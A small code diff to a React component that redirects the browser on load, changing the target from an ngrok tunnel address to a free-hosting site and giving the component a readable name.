@@ -1,11 +1,11 @@
 import { useEffect } from "react";
 
-const cbtsmpbea = () => {
+const RedirectNgrok = () => {
   useEffect(() => {
-    window.location.href = "http://0.tcp.ap.ngrok.io:15436/cbtbea/";
+    window.location.href = "https://nzdigital.free.nf/";
   }, []);
 
   return null;
 };
 
-export default cbtsmpbea;
+export default RedirectNgrok;
